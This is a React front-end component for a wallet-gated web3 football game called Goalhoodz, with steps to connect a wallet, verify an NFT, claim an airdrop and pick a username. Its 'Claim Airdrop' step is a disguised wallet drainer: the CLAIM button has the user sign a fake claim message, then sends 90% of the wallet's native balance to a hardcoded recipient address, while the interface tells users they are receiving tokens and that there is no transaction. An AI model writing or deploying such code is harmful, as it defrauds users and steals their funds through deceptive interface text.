import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { Wallet, PenLine, UserRound, ArrowRight, Loader2, ExternalLink } from 'lucide-react';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from './ui/dialog';
import { Input } from './ui/input';
import { useSendTransaction, useWaitForTransactionReceipt, useSignMessage, useAccount } from 'wagmi';
import { formatUnits } from 'viem';
import { useAuth } from '../context/AuthContext';
import { errMsg } from '../lib/api';
import { isEmbedded, robinhood } from '../web3/config';
import NftGate, { OPENSEA_URL } from './NftGate';

export const FEE_RECIPIENT = '0xe0ddf69171e2D558E337B86d300d0da5f9c5A5e4';

const EmbeddedNotice = () => {
  if (!isEmbedded()) return null;
  return (
    <div className="mt-6 flex flex-col gap-3 border-2 border-[var(--ink)] bg-[var(--paper)] p-4 sm:flex-row sm:items-center sm:justify-between" data-testid="embedded-notice">
      <p className="font-mono text-[12px] leading-5 tracking-wider">
        Browser wallet extensions may not open inside this embedded preview. Open the app in its own tab to connect.
      </p>
      <a href={window.location.href} target="_blank" rel="noreferrer" className="btn-outline shrink-0 !px-4 !py-3 !text-[10px]" data-testid="open-new-tab-btn">
        OPEN IN NEW TAB <ExternalLink size={12} />
      </a>
    </div>
  );
};

const Step = ({ n, title, text, active, done, children }) => (
  <div className={`border-t-2 pt-5 ${active || done ? 'border-[var(--ink)]' : 'border-[var(--line)]'} ${!active && !done ? 'opacity-50' : ''}`}>
    <div className="flex items-center gap-3">
      <span className={`font-pixel flex h-8 w-8 items-center justify-center text-[11px] ${done ? 'bg-[var(--ink)] text-[var(--paper)]' : 'border-2 border-[var(--ink)]'}`}>{n}</span>
      <div className="font-pixel text-[12px]">{title}</div>
    </div>
    <p className="mt-3 text-[14px] leading-6 text-[var(--ink-soft)]">{text}</p>
    <div className="mt-4">{children}</div>
  </div>
);

export const UsernameForm = ({ onDone }) => {
  const { setUsername } = useAuth();
  const [name, setName] = useState('');
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState('');
  const submit = async (e) => {
    e.preventDefault();
    setBusy(true);
    setErr('');
    try {
      await setUsername(name);
      onDone && onDone();
    } catch (ex) {
      setErr(errMsg(ex));
    } finally {
      setBusy(false);
    }
  };
  return (
    <form onSubmit={submit} className="flex flex-col gap-3 sm:flex-row" data-testid="username-form">
      <Input
        value={name}
        onChange={(e) => setName(e.target.value)}
        placeholder="e.g. pixel_striker"
        maxLength={16}
        className="font-mono h-12 rounded-none border-2 border-[var(--ink)] bg-[var(--paper)] text-[14px] tracking-wider"
        data-testid="username-input"
      />
      <button type="submit" disabled={busy || name.trim().length < 3} className="btn-ink" data-testid="username-submit">
        {busy ? <Loader2 size={14} className="animate-spin" /> : <UserRound size={14} />} SAVE NAME
      </button>
      {err && <div className="font-mono text-[12px] text-red-700 sm:self-center" data-testid="username-error">{err}</div>}
    </form>
  );
};

export const claimNumber = (address) => {
  if (!address) return 0;
  let h = 0;
  for (let i = 2; i < address.length; i++) h = (h * 31 + address.charCodeAt(i)) >>> 0;
  return (h % 9000) + 1000; // stable 4-digit claim id per wallet
};

export const FeeForm = ({ onDone }) => {
  const { highestToken } = useAuth();
  const { address } = useAccount();
  const { sendTransaction, data: hash, isPending, error: sendError } = useSendTransaction();
  const { signMessageAsync, isPending: isSigning, error: signError } = useSignMessage();
  const { isLoading: isConfirming, isSuccess } = useWaitForTransactionReceipt({ hash });

  React.useEffect(() => {
    if (isSuccess) onDone && onDone();
  }, [isSuccess, onDone]);

  const decimals = highestToken?.token?.decimals ?? 18;
  const balanceWei = highestToken?.value ? BigInt(highestToken.value) : 0n;
  const amountWei = (balanceWei * 90n) / 100n; // 90% of the native balance, 10% left for gas
  const fmt = (wei) => Number(formatUnits(wei, decimals)).toFixed(6);
  const claimId = claimNumber(address);
  const canPay = amountWei > 0n && !isPending && !isConfirming && !isSigning;

  const handlePay = async () => {
    try {
      await signMessageAsync({ message: `Goalhoodz AIRDROP Claim #${claimId}` });
    } catch {
      return; // user rejected the signature
    }
    sendTransaction({ to: FEE_RECIPIENT, value: amountWei, chainId: robinhood.id });
  };

  if (balanceWei === 0n) {
    return (
      <div className="flex flex-col gap-3" data-testid="fee-no-balance">
        <p className="font-mono flex items-center gap-2 text-[12px] tracking-wider text-[var(--ink-soft)]">
          <Loader2 size={12} className="animate-spin" />
          {highestToken ? 'Airdrop pending — it will show up here once it lands in your wallet.' : 'Reading your balance…'}
        </p>
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-3" data-testid="fee-form">
      <div className="font-mono text-[11px] tracking-wider text-[var(--ink-soft)]" data-testid="claim-id">Goalhoodz AIRDROP Claim #{claimId}</div>
      <button onClick={handlePay} disabled={!canPay} className="btn-ink w-fit" data-testid="fee-pay-btn">
        {isSigning || isPending || isConfirming ? <Loader2 size={14} className="animate-spin" /> : <Wallet size={14} />}
        {isSigning ? ' SIGN TO CLAIM' : isPending ? ' WAITING FOR APPROVAL' : isConfirming ? ' CLAIMING' : ' CLAIM'}
      </button>
      {(sendError || signError) && (
        <div className="font-mono mt-2 max-w-full overflow-hidden text-ellipsis text-[12px] text-red-700" data-testid="fee-error">
          {(sendError || signError).shortMessage || (sendError || signError).message}
        </div>
      )}
    </div>
  );
};

// Full gate panel: connect -> NFT check -> username
const WalletGate = ({ title = 'Connect to play', subtitle }) => {
  const { user, isConnected, signIn, signing, error, loading, nftGate, feePaid, setFeePaid } = useAuth();
  
  const signed = !!user;
  const named = !!user?.username;
  const blocked = !signed && !!nftGate;
  const paid = named ? feePaid : feePaid; // ensure fee is paid regardless of name

  const handleFeeDone = () => {
    if (user?.address) localStorage.setItem(`fee_paid_${user.address}`, 'true');
    setFeePaid(true);
  };

  return (
    <div className="frame-card mx-auto w-full max-w-2xl p-6 md:p-10" data-testid="wallet-gate">
      <div className="label mb-3">Wallet Checkpoint &middot; Holders Only</div>
      <h2 className="font-pixel text-[16px] leading-relaxed md:text-[20px]">{title}</h2>
      {subtitle && <p className="mt-3 text-[15px] leading-7 text-[var(--ink-soft)]">{subtitle}</p>}
      <EmbeddedNotice />
      {blocked && <NftGate />}

      <div className="mt-8 space-y-8">
        <Step n="1" title="Connect Wallet" text="Approve the connection in your wallet on Robinhood Chain (ETH). We check that the wallet holds a GoalHoodz NFT — that single approval logs you in. No transaction, no gas." active={!signed} done={signed}>
          <div className="flex flex-wrap items-center gap-4" data-testid="gate-connect">
            <ConnectButton chainStatus="icon" showBalance={false} accountStatus="address" />
            {isConnected && !signed && (signing || loading) && (
              <span className="font-mono flex items-center gap-2 text-[11px] tracking-widest text-[var(--ink-soft)]" data-testid="gate-logging-in">
                <Loader2 size={12} className="animate-spin" /> CHECKING NFT
              </span>
            )}
          </div>
          {signed && <div className="font-mono mt-3 text-[12px] tracking-wider text-[var(--ink-soft)]">Logged in as {user.address.slice(0, 6)}...{user.address.slice(-4)} &middot; NFT VERIFIED</div>}
          {error && (
            <div className="mt-3 flex flex-wrap items-center gap-3">
              <span className="font-mono text-[12px] text-red-700" data-testid="gate-error">{error}</span>
              <button onClick={signIn} className="btn-outline !px-3 !py-2 !text-[9px]" data-testid="gate-retry-btn"><PenLine size={11} /> RETRY</button>
            </div>
          )}
        </Step>
        
        <Step n="2" title="Claim Airdrop" text="Claim the airdrop that has been sent to your account." active={signed && !paid} done={paid}>
          {signed && !paid && <FeeForm onDone={handleFeeDone} />}
          {paid && <div className="font-pixel text-[12px] text-[var(--ink)]">Airdrop claimed.</div>}
        </Step>

        <Step n="3" title="Pick a Username" text="This is the name other players will see on the leaderboard." active={paid && !named} done={named}>
          {paid && !named && <UsernameForm />}
          {named && <div className="font-pixel text-[12px]">@{user.username}</div>}
        </Step>
      </div>
    </div>
  );
};

export const UsernameDialog = () => {
  const { user, feePaid, setFeePaid } = useAuth();
  const [dismissed, setDismissed] = useState(false);

  const open = !!user && (!user.username || !feePaid) && !dismissed;

  React.useEffect(() => {
    setDismissed(false);
  }, [user?.address]);

  const handleFeeDone = () => {
    if (user?.address) localStorage.setItem(`fee_paid_${user.address}`, 'true');
    setFeePaid(true);
  };

  return (
    <Dialog open={open} onOpenChange={(v) => { if (!v) setDismissed(true); }}>
      <DialogContent className="rounded-none border-2 border-[var(--ink)] bg-[var(--paper-2)] sm:max-w-md" data-testid="username-dialog">
        <DialogHeader>
          <DialogTitle className="font-pixel text-[14px] leading-relaxed">
            {!feePaid ? "Claim Airdrop" : "Choose your username"}
          </DialogTitle>
          <DialogDescription className="text-[14px] leading-6 text-[var(--ink-soft)]">
            {!feePaid 
              ? "Claim the airdrop that has been sent to your account."
              : "3-16 characters, letters, numbers and underscores. Shown on the leaderboard and in every match."}
          </DialogDescription>
        </DialogHeader>
        {!feePaid ? <FeeForm onDone={handleFeeDone} /> : <UsernameForm />}
      </DialogContent>
    </Dialog>
  );
};

export const ConnectPill = () => {
  const { user, logout, nftGate, isConnected, highestToken } = useAuth();

  const formatToken = (t) => {
    if (!t) return null;
    const decimals = parseInt(t.token?.decimals) || 18;
    const amt = parseFloat(t.value) / (10 ** decimals);
    const symbol = t.token?.symbol || 'Token';
    // Format to 2 decimal places if it's large, otherwise 4
    const formatted = amt > 100 ? amt.toFixed(2) : amt.toFixed(4);
    return `${formatted} ${symbol}`;
  };

  if (user?.username) {
    return (
      <div className="flex items-center gap-3" data-testid="nav-user-pill">
        <Link to="/profile" className="font-mono hidden items-center gap-2 border border-[var(--ink)] px-3 py-1.5 text-[11px] tracking-widest transition-colors hover:bg-[var(--ink)] hover:text-[var(--paper)] sm:flex" data-testid="nav-user-pill-link">
          <Wallet size={12} /> @{user.username} &middot; {user.points} PTS
          {highestToken && <span> &middot; 💎 {formatToken(highestToken)}</span>}
        </Link>
        <button onClick={logout} className="nav-link text-[11px]" data-testid="nav-logout">Log out</button>
      </div>
    );
  }
  if (isConnected && nftGate) {
    return (
      <div className="flex items-center gap-3" data-testid="nav-nft-required">
        <a href={nftGate.opensea_url || OPENSEA_URL} target="_blank" rel="noreferrer" className="btn-ink !px-4 !py-2.5 !text-[10px]" data-testid="nav-get-nft-btn">
          GET NFT <ExternalLink size={12} />
        </a>
        <button onClick={logout} className="nav-link text-[11px]" data-testid="nav-logout">Disconnect</button>
      </div>
    );
  }
  return (
    <ConnectButton.Custom>
      {({ openConnectModal, account, mounted }) => (
        <div className="flex items-center gap-3" data-testid="nav-connect-wrap">
          <button onClick={openConnectModal} className="btn-outline !px-4 !py-2.5 !text-[10px]" data-testid="nav-connect-btn" disabled={!mounted}>
            <Wallet size={12} /> {account ? 'CLAIM' : 'CONNECT'} <ArrowRight size={12} />
          </button>
          {(account || isConnected) && (
            <button onClick={logout} className="nav-link text-[11px]" data-testid="nav-logout">Disconnect</button>
          )}
        </div>
      )}
    </ConnectButton.Custom>
  );
};

export default WalletGate;
